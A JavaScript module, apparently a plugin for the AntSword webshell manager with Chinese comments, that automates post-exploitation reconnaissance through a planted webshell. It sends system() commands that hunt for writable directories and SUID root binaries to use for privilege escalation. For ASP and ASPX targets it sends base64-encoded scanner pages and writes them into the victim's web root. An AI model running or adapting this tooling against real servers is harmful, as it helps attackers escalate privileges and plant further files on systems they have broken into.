/**
 * 核心模块
 */

class Core {
  constructor(opt,argv) {
    let self = this;
    return new Promise((res, rej) => {
      let core = new antSword['core'][opt['type']](opt);
      switch (argv.type) {
        case "username":
          switch (argv.file_type) {
            case "php":
            core.request({
                _: this._check_user(argv.user)
              }).then((temp) => {
                var check = temp.text;
                if (check == "") {
                  return rej("Cannot find the user");
                }
              })
              core.request({
                _: this._find_path(argv.user)
              }).then(res)
                  .catch((err) => {
                    return rej(err);
                  });
              break;

            case "asp":
              core.request({
                _: this._upload_shell_asp()
              }).then(res)
                  .catch((err) => {
                    return rej(err);
                  });
              break;

            case "aspx":
              core.request({
                _: this._upload_shell_aspx()
              }).then(res)
                  .catch((err) => {
                    return rej(err);
                  });
              break;
          }
          break;
      }
    })
  }

  //检查用户是否存在
  _check_user(user) {

    return `system('id -nu ${user}')`;

  }

 //查找rwx目录以及suid提权文件并一起返回
  _find_path(user) {

      return `system ('find / -type d -perm -700 -user ${user} ; find / -type d -perm -007 -user root ; echo ph4ntom_ph4ntom ;find / -user root -perm -4000 ')`

  }

  //在webshell为asp类型的情况下创建检测脚本
  _upload_shell_asp(){

    return `
Sub WriteToTextFile (FileUrl,byval Str,CharSet)set stm=server.CreateObject("adodb.stream"):stm.Type=2:stm.mode=3:stm.charset=CharSet:stm.open:stm.WriteText str:stm.SaveToFile server.MapPath(FileUrl),2:stm.flush:stm.Close:set stm=nothing:End Sub:Function Base64Decode(ByVal vCode):Dim oXML, oNode:Set oXML = CreateObject("Msxml2.DOMDocument.3.0"):Set oNode = oXML.CreateElement("base64"):oNode.dataType = "bin.base64":oNode.text = vCode:Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue):Set oNode = Nothing:Set oXML = Nothing:End Function:Private Function Stream_BinaryToString(Binary):Const adTypeText = 2:Const adTypeBinary = 1:Dim BinaryStream:Set BinaryStream = CreateObject("ADODB.Stream"):BinaryStream.Type = adTypeBinary:BinaryStream.Open:BinaryStream.Write Binary:BinaryStream.Position = 0:BinaryStream.Type = adTypeText:BinaryStream.CharSet = "utf-8":Stream_BinaryToString = BinaryStream.ReadText:Set BinaryStream = Nothing:End Function:shell = "PEhUTUw+CjxIRUFEPgo8VElUTEU+55uu5b2V6K+75YaZ5qOA5rWLPC9USVRMRT4KPE1FVEEgSFRUUC1FUVVJVj0iQ29udGVudC1UeXBlIiBDT05URU5UPSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPgo8U1RZTEUgVFlQRT0idGV4dC9jc3MiPgphIHt0ZXh0LWRlY29yYXRpb246IG5vbmV9CmE6aG92ZXIge3RleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyBjb2xvcjogI0ZGOTkwMH0Kc2VsZWN0LHRleHRhcmVhLHByZSx0ZCx0aCxib2R5LGlucHV0e2ZvbnQtZmFtaWx5OiAi5a6L5L2TIjtmb250LXNpemU6IDlwdH0KLkVkaXQgewlib3JkZXI6IDFweCBncm9vdmUgIzY2NjY2Njt9Ci5idXQxIHtmb250LXNpemU6IDlwdDsgYm9yZGVyLXdpZHRoOiAxcHg7IGN1cnNvcjogaGFuZH0KPC9TVFlMRT4KPC9IRUFEPgoKPEJPRFk+CjwlClJlc3BvbnNlLkJ1ZmZlciA9IFRydWUKU2VydmVyLlNjcmlwdFRpbWVPdXQ9OTk5OTk5OTk5ICAgJ+aTjeS9nOavlOi+g+iAl+aXtgogIApDT05TVF9GU089IlNjcmlwdCImImluZy5GaWwiJiJlU3lzdCImImVtT2JqZWN0IgoKCifliKTmlq3mnIDlkI7mmK/lkKbmnInliqBcCmZ1bmN0aW9uIEdldEZ1bGxQYXRoKHBhdGgpCglHZXRGdWxsUGF0aCA9IHBhdGgKCWlmIFJpZ2h0KHBhdGgsMSkgPD4gIlwiIHRoZW4gR2V0RnVsbFBhdGggPSBwYXRoJiJcIiAn5aaC5p6c5a2X56ym5pyA5ZCO5LiN5pivIFwg55qE5bCx5Yqg5LiKCmVuZCBmdW5jdGlvbgoKJ+WIoOmZpOaWh+S7tgpGdW5jdGlvbiBEZWx0ZXh0ZmlsZShmaWxlcGF0aCkKIE9uIEVycm9yIFJlc3VtZSBOZXh0CiBTZXQgb2JqRlNPID0gQ3JlYXRlT2JqZWN0KENPTlNUX0ZTTykgCiAgaWYgb2JqRlNPLkZpbGVFeGlzdHMoZmlsZXBhdGgpIHRoZW4gJ+ajgOafpeaWh+S7tuaYr+WQpuWtmOWcqCAKICAgb2JqRlNPLkRlbGV0ZUZpbGUoZmlsZXBhdGgpIAogIGVuZCBpZiAKIFNldCBvYmpGU08gPSBub3RoaW5nCiBEZWx0ZXh0ZmlsZSA9IEVyci5OdW1iZXIgJ+i/lOWbnumUmeivr+eggSAKRW5kIEZ1bmN0aW9uIAoKCifmo4DmtYvnm67lvZXmmK/lkKblj6/lhpkgMCDkuLrlj6/or7vlhpkgMeS4uuWPr+WGmeS4jeWPr+S7peWIoOmZpApGdW5jdGlvbiBDaGVja0RpcklzT0tXcml0ZShEaXJTdHIpCglPbiBFcnJvciBSZXN1bWUgTmV4dAoJU2V0IEZTTyA9IFNlcnZlci5DcmVhdGVPYmplY3QoQ09OU1RfRlNPKQoJZmlsZXBhdGggPSBHZXRGdWxsUGF0aChEaXJTdHIpJmZzby5HZXR0ZW1wTmFtZQoJRlNPLkNyZWF0ZVRleHRGaWxlKGZpbGVwYXRoKSAKCUNoZWNrRGlySXNPS1dyaXRlID0gRXJyLk51bWJlciAn6L+U5Zue6ZSZ6K+v56CBIAoJaWYgIFNob3dOb1dyaXRlRGlyIGFuZCAoQ2hlY2tEaXJJc09LV3JpdGUgPTcwKSB0aGVuCgkJUmVzcG9uc2UuV3JpdGUgIls8Zm9udCBjb2xvcj0jMDA2NkZGPuebruW9lTwvZm9udD5dIiZEaXJTdHImIiBbPGZvbnQgY29sb3I9cmVkPiImRXJyLkRlc2NyaXB0aW9uJiI8L2ZvbnQ+XTxicj4iCgllbmQgaWYKCXNldCBmb3V0ID1Ob3RoaW5nCglzZXQgRlNPID0gTm90aGluZwoJRGVsdGV4dGZpbGUoZmlsZXBhdGgpICfliKDpmaTmjokKCWlmIENoZWNrRGlySXNPS1dyaXRlPTAgYW5kIERlbHRleHRmaWxlKGZpbGVwYXRoKT03MCB0aGVuIENoZWNrRGlySXNPS1dyaXRlID0xCmVuZCBGdW5jdGlvbgoKCmZ1bmN0aW9uIENoZWNrRmlsZVdyaXRlKGZpbGVwYXRoKQoJT24gRXJyb3IgUmVzdW1lIE5leHQKCVNldCBGU08gPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KENPTlNUX0ZTTykJCglzZXQgZ2V0QXR0PUZTTy5HZXRGaWxlKGZpbGVwYXRoKQoJZ2V0QXR0LkF0dHJpYnV0ZXMgPSBnZXRBdHQuQXR0cmlidXRlcwogIENoZWNrRmlsZVdyaXRlID0gRXJyLk51bWJlciAKCXNldCBGU08gPSBOb3RoaW5nCglzZXQgZ2V0QXR0ID0gTm90aGluZyAgCmVuZCBmdW5jdGlvbgoKJ+ajgOa1i+ebruW9leeahOWPr+ivu+WGmeaApwpmdW5jdGlvbiBTaG93RGlyV3JpdGVfRGlyX0ZpbGUoUGF0aCxDaGVja0ZpbGUsQ2hlY2tOZXh0RGlyKQoJT24gRXJyb3IgUmVzdW1lIE5leHQKCVNldCBGU08gPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KENPTlNUX0ZTTykKCUIgPSBGU08uRm9sZGVyRXhpc3RzKFBhdGgpCglzZXQgRlNPPW5vdGhpbmcKCQogICfmmK/lkKbkuLrkuLTml7bnm67lvZXlkozmmK/lkKbopoHmo4DmtYsKICBJU19URU1QX0RJUiA9CShpbnN0cihVQ2FzZShQYXRoKSwiV0lORE9XU1xURU1QIik+MCkgYW5kIE5vQ2hlY2tUZW1wCiAgCQkKCWlmIEI9ZmFsc2UgdGhlbiAn5aaC5p6c5LiN5piv55uu5b2V5bCx6L+b6KGM5paH5Lu25qOA5rWLCgoJCVJlID0gQ2hlY2tGaWxlV3JpdGUoUGF0aCkgJ+ajgOa1i+aYr+WQpuWPr+WGmQoJCWlmIFJlID0wIHRoZW4KCQkJUmVzcG9uc2UuV3JpdGUgIlvmlofku7ZdPGZvbnQgY29sb3I9cmVkPiImUGF0aCYiPC9mb250Pjxicj4iCgkJCWIgPXRydWUKCQkJZXhpdCBmdW5jdGlvbgoJCWVsc2UKCQkJUmVzcG9uc2UuV3JpdGUgIls8Zm9udCBjb2xvcj1yZWQ+5paH5Lu2PC9mb250Pl0iJlBhdGgmIiBbPGZvbnQgY29sb3I9cmVkPiImRXJyLkRlc2NyaXB0aW9uJiI8L2ZvbnQ+XTxicj4iCQkJCQkJCgkJCWV4aXQgZnVuY3Rpb24KCQllbmQgaWYJCgoJZW5kIGlmCgkKCgkKCVBhdGggPSBHZXRGdWxsUGF0aChQYXRoKSAKCQoJcmUgPSBDaGVja0RpcklzT0tXcml0ZShQYXRoKSAKCWlmIChyZSA9MCkgb3IgKHJlPTEpIHRoZW4KCQlSZXNwb25zZS5Xcml0ZSAiW+ebruW9lV08Zm9udCBjb2xvcj0jMDAwMEZGPiImIFBhdGgmIjwvZm9udD48YnI+IgoJZW5kIGlmCgpTZXQgRlNPID0gU2VydmVyLkNyZWF0ZU9iamVjdChDT05TVF9GU08pCnNldCBmID0gZnNvLmdldGZvbGRlcihQYXRoKQoKCgppZiAoQ2hlY2tGaWxlPVRydWUpIGFuZCAoSVNfVEVNUF9ESVI9ZmFsc2UpIHRoZW4KYj1mYWxzZQpmb3IgZWFjaCBmaWxlIGluIGYuRmlsZXMKCVJlID0gQ2hlY2tGaWxlV3JpdGUoUGF0aCZmaWxlLm5hbWUpICfmo4DmtYvmmK/lkKblj6/lhpkKCWlmIFJlID0wIHRoZW4KCQlSZXNwb25zZS5Xcml0ZSAiW+aWh+S7tl08Zm9udCBjb2xvcj1yZWQ+IiYgUGF0aCZmaWxlLm5hbWUmIjwvZm9udD48YnI+IgoJCWIgPXRydWUKCWVsc2UKCQlpZiBTaG93Tm9Xcml0ZURpciB0aGVuIFJlc3BvbnNlLldyaXRlICJbPGZvbnQgY29sb3I9cmVkPuaWh+S7tjwvZm9udD5dIiZQYXRoJmZpbGUubmFtZSYiIFs8Zm9udCBjb2xvcj1yZWQ+IiZFcnIuRGVzY3JpcHRpb24mIjwvZm9udD5dPGJyPiIJCQkKCWVuZCBpZgpuZXh0CmlmIGIgdGhlbiByZXNwb25zZS5GbHVzaCAn5aaC5p6c5pyJ5YaF5a655bCx5Yi35pawCmVuZCBpZgoKCgonPT09PT09PT09PT09PSDnm67lvZXmo4DmtYsgPT09PT09PT09PT09PT09PQpmb3IgZWFjaCBmaWxlIGluIGYuU3ViRm9sZGVycwppZiBDaGVja05leHREaXI9ZmFsc2UgdGhlbiAn5piv5ZCm5qOA5rWL5LiL5LiA5Liq55uu5b2VCglyZSA9IENoZWNrRGlySXNPS1dyaXRlKFBhdGgmZmlsZS5uYW1lKQoJaWYgKHJlID0wKSBvciAocmU9MSkgdGhlbgoJCVJlc3BvbnNlLldyaXRlICJb55uu5b2VXTxmb250IGNvbG9yPSMwMDY2RkY+IiYgUGF0aCZmaWxlLm5hbWUmIjwvZm9udD48YnI+IgoJZW5kIGlmCmVuZCBpZgoJCglpZiAoQ2hlY2tOZXh0RGlyPVRydWUpIGFuZCAoSVNfVEVNUF9ESVI9ZmFsc2UpIHRoZW4gJ+aYr+WQpuajgOa1i+S4i+S4gOS4quebruW9lQoJCQlTaG93RGlyV3JpdGVfRGlyX0ZpbGUgUGF0aCZmaWxlLm5hbWUsQ2hlY2tGaWxlLENoZWNrTmV4dERpciAn5YaN5qOA5rWL5LiL5LiA5Liq55uu5b2VCgllbmQgaWYKbmV4dAoKU2V0IEZTTyA9IE5vdGhpbmcKc2V0IGYgPSBOb3RoaW5nCmVuZCBmdW5jdGlvbgoKCmlmIFJlcXVlc3QoIlBhdGhzIikgPSIiIHRoZW4KUGF0aHNfc3RyPSJjOlx3aW5kb3dzXCImY2hyKDEzKSZjaHIoMTApJiJjOlxEb2N1bWVudHMgYW5kIFNldHRpbmdzXCImY2hyKDEzKSZjaHIoMTApJiJjOlxQcm9ncmFtIEZpbGVzXCIKaWYgU2Vzc2lvbigicGF0aHMiKTw+IiIgdGhlbiAgUGF0aHNfc3RyPVNlc3Npb24oInBhdGhzIikKCVJlc3BvbnNlLldyaXRlICI8Zm9ybSBpZD0nZm9ybTEnIG5hbWU9J2Zvcm0xJyBtZXRob2Q9J3Bvc3QnIGFjdGlvbj0nJz4iCglSZXNwb25zZS5Xcml0ZSAi5qOA5rWL55uu5b2V6K+75YaZ5oOF5Ya1PGJyPiIJCglSZXNwb25zZS5Xcml0ZSAiPHRleHRhcmVhIG5hbWU9J1BhdGhzJyBjb2xzPSc4MCcgcm93cz0nMTAnIGNsYXNzPSdFZGl0Jz4iJlBhdGhzX3N0ciYiPC90ZXh0YXJlYT4iCglSZXNwb25zZS5Xcml0ZSAiPGJyIC8+IgoJUmVzcG9uc2UuV3JpdGUgIjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2J1dHRvbicgdmFsdWU9J+W8gOWni+ajgOa1iycgLyBjbGFzcz0nYnV0MSc+IgoJUmVzcG9uc2UuV3JpdGUgIjxsYWJlbCBmb3I9J0NoZWNrTmV4dERpcic+IgoJUmVzcG9uc2UuV3JpdGUgIjxpbnB1dCBuYW1lPSdDaGVja05leHREaXInIHR5cGU9J2NoZWNrYm94JyBpZD0nQ2hlY2tOZXh0RGlyJyBjaGVja2VkPSdjaGVja2VkJyAvPua1i+ivleebruW9lSAgIgoJUmVzcG9uc2UuV3JpdGUgIjwvbGFiZWw+IgoJUmVzcG9uc2UuV3JpdGUgIjxsYWJlbCBmb3I9J0NoZWNrRmlsZSc+IgoJUmVzcG9uc2UuV3JpdGUgIjxpbnB1dCBuYW1lPSdDaGVja0ZpbGUnIHR5cGU9J2NoZWNrYm94JyBpZD0nQ2hlY2tGaWxlJyAgLz7mtYvor5Xmlofku7YiCglSZXNwb25zZS5Xcml0ZSAiPC9sYWJlbD4iCglSZXNwb25zZS5Xcml0ZSAiPGxhYmVsIGZvcj0nU2hvd05vV3JpdGUnPiIKCVJlc3BvbnNlLldyaXRlICI8aW5wdXQgbmFtZT0nU2hvd05vV3JpdGUnIHR5cGU9J2NoZWNrYm94JyBpZD0nU2hvd05vV3JpdGUnIGNoZWNrZWQ9J2NoZWNrZWQnIC8+IgoJUmVzcG9uc2UuV3JpdGUgIuaYvuemgeWGmeebruW9leWSjOaWh+S7tjwvbGFiZWw+IgoJUmVzcG9uc2UuV3JpdGUgIjxsYWJlbCBmb3I9J05vQ2hlY2tUZW1wJz4iCglSZXNwb25zZS5Xcml0ZSAiPGlucHV0IG5hbWU9J05vQ2hlY2tUZW1wJyB0eXBlPSdjaGVja2JveCcgaWQ9J05vQ2hlY2tUZW1wJyBjaGVja2VkPSdjaGVja2VkJyAvPiIKCVJlc3BvbnNlLldyaXRlICLkuI3mo4DmtYvkuLTml7bnm67lvZU8L2xhYmVsPiIJCglSZXNwb25zZS5Xcml0ZSAiPC9mb3JtPiIKZWxzZQpSZXNwb25zZS5Xcml0ZSAgIjxhIGhyZWY9IiI/IiI+6YeN5paw6L6T5YWl6Lev5b6EPC9hPjxicj4iCkNoZWNrRmlsZSA9IChSZXF1ZXN0KCJDaGVja0ZpbGUiKT0ib24iKQpDaGVja05leHREaXIgPSAoUmVxdWVzdCgiQ2hlY2tOZXh0RGlyIik9Im9uIikKU2hvd05vV3JpdGVEaXIgPSAoUmVxdWVzdCgiU2hvd05vV3JpdGUiKT0ib24iKQpOb0NoZWNrVGVtcCA9IChSZXF1ZXN0KCJOb0NoZWNrVGVtcCIpPSJvbiIpClJlc3BvbnNlLldyaXRlICLmo4DmtYvml7bpl7TovoPplb/vvIzor7fnrYnlvoUuLi4uLi4uLi48YnI+IgpyZXNwb25zZS5GbHVzaAoKU2Vzc2lvbigicGF0aHMiKSA9IFJlcXVlc3QoIlBhdGhzIikKClBhdGhzU3BsaXQ9U3BsaXQoUmVxdWVzdCgiUGF0aHMiKSxjaHIoMTMpJmNocigxMCkpIApGb3IgaT1MQm91bmQoUGF0aHNTcGxpdCkgVG8gVUJvdW5kKFBhdGhzU3BsaXQpIAppZiBpbnN0cihQYXRoc1NwbGl0KGkpLCI6Iik+MCB0aGVuCglTaG93RGlyV3JpdGVfRGlyX0ZpbGUgVHJpbShQYXRoc1NwbGl0KGkpKSxDaGVja0ZpbGUsQ2hlY2tOZXh0RGlyCkVuZCBJZiAKTmV4dApSZXNwb25zZS5Xcml0ZSAiW+aJq+aPj+WujOaIkF08YnI+IgplbmQgaWYKCgoKJT4KPC9CT0RZPg==":call WriteToTextFile("detect.asp",Base64Decode(shell),"utf-8"):
`;

  }


  //在webshell为aspx类型的情况下创建检测脚本
  _upload_shell_aspx(){

    return `
  var dom = new ActiveXObject("Microsoft.XMLDOM");var elem = dom.createElement("tmp");elem.dataType = "bin.base64";elem.text = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBWYWxpZGF0ZVJlcXVlc3Q9ImZhbHNlIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLklPIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLlRleHQiICU+CgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxNRVRBIEhUVFAtRVFVSVY9IkNvbnRlbnQtVHlwZSIgQ09OVEVOVD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ij4KPGhlYWQgcnVuYXQ9InNlcnZlciI+CiAgICA8dGl0bGU+U2NhbldydGllYWJsZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgogICAgPHNjcmlwdCBydW5hdD0ic2VydmVyIj4KICAgIAogICAgICAgIHByb3RlY3RlZCB2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgICAgICB7CiAgICAgICAgfQogICAgICAgIGludCBjcmVzdWx0czsKICAgICAgICBwcm90ZWN0ZWQgdm9pZCBTY2FuUmlnaHRzKERpcmVjdG9yeUluZm8gY2RpcikKICAgICAgICB7CiAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIERpcmVjdG9yeUluZm9bXSBzdWJkaXJzID0gY2Rpci5HZXREaXJlY3RvcmllcygpOwogICAgICAgICAgICAgICAgZm9yZWFjaCAoRGlyZWN0b3J5SW5mbyBpdGVtIGluIHN1YmRpcnMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2NhblJpZ2h0cyhpdGVtKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBGaWxlLkNyZWF0ZShjZGlyLkZ1bGxOYW1lICsgIlxcdGVzdCIpLkNsb3NlKCk7CiAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHRoaXMuTGJfbXNnLlRleHQgKz0gY2Rpci5GdWxsTmFtZSsiPGJyLz4iOwogICAgICAgICAgICAgICAgICAgIGNyZXN1bHRzKys7CiAgICAgICAgICAgICAgICAgICAgRmlsZS5EZWxldGUoY2Rpci5GdWxsTmFtZSArICJcXHRlc3QiKTsKCiAgICAgICAgICAgICB9CgogICAgICAgICAgICAgY2F0Y2ggeyB9CiAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIFN5c3RlbS5EYXRlVGltZSBzdGFydCA9IERhdGVUaW1lLk5vdzsKICAgICAgICBwcm90ZWN0ZWQgdm9pZCBDbGVhckFsbFRocmVhZF9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgICAgICB7CiAgICAgICAgICAgIHRoaXMuTGJfbXNnIC5UZXh0PSAiIjsKICAgICAgICAgICAgY3Jlc3VsdHMgPSAwOwogICAgICAgICAgICBTY2FuUmlnaHRzKG5ldyBEaXJlY3RvcnlJbmZvKEZwb3J0X1RleHRCb3guVGV4dCkpOwogICAgICAgICAgICBUaW1lU3BhbiB1c2V0aW1lID0gU3lzdGVtLkRhdGVUaW1lLk5vdyAtIHN0YXJ0OwogICAgICAgICAgICB0aGlzLkxiX21zZy5UZXh0ICs9InVzZXRpbWU6ICIrIHVzZXRpbWUuVG90YWxTZWNvbmRzLlRvU3RyaW5nKCk7CiAgICAgICAgfQogICAgICAgIAoKICAgIDwvc2NyaXB0PgoKICAgIDxmb3JtIGlkPSJmb3JtMSIgcnVuYXQ9InNlcnZlciI+CiAgIAogICAgPGRpdj4KICAgICAgICAgVGFyZ2V0IHBhdGg6PGFzcDpUZXh0Qm94IElEPSJGcG9ydF9UZXh0Qm94IiBydW5hdD0ic2VydmVyIiBUZXh0PSJjOlwiIFdpZHRoPSI2MHB4Ij48L2FzcDpUZXh0Qm94PiZuYnNwOyZuYnNwOyAKICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iQnV0dG9uIiBydW5hdD0ic2VydmVyIiBPbkNsaWNrPSJDbGVhckFsbFRocmVhZF9DbGljayIgVGV4dD0iU2NhbldyaXRlcmFibGUiIC8+PGJyIC8+CiAgICAgICAgPGFzcDpMYWJlbCBJRD0iTGJfbXNnIiBydW5hdD0ic2VydmVyIiBUZXh0PSIiPjwvYXNwOkxhYmVsPgogICAgICAgIDxiciAvPgogICAgICAgICZuYnNwOzwvZGl2PgogICAgICAgCiAgICA8L2Zvcm0+CjwvYm9keT4KPC9odG1sPg==";var appPath = Request.PhysicalApplicationPath;var decodeBase64 = elem.nodeTypedValue;var inputStream = new ActiveXObject('ADODB.Stream');inputStream.Open();inputStream.Type = 1;  inputStream.Write(decodeBase64);inputStream.SaveToFile(appPath+"detect.aspx",2);
    `;

  }
}

module.exports = Core;
